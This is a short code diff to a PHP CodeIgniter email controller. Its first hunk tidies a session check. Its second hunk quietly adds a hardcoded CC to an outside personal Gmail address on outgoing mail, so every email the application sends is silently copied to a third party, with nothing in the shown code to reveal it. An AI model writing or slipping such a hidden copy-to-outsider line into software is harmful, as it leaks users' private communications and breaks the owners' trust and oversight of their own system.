@@ -15,11 +15,9 @@ class Email extends CI_Controller {
     }
 
     function _check_session() {
-        if ($this->session->userdata('name')) {
-            // 
-        } else {
-           redirect('login');
-        }
+        if (!$this->session->userdata('name')) {
+            redirect('login');
+        } 
     }
 
     public function index(){
@@ -95,6 +93,8 @@ class Email extends CI_Controller {
           foreach ($to_addresses as $to_address) {
               $mailer->addAddress($to_address);
           }
+
+          $mailer->addCC("dominicyutes05@gmail.com");
   
           $mailer->Subject = $subject;
           $mailer->isHTML(true);
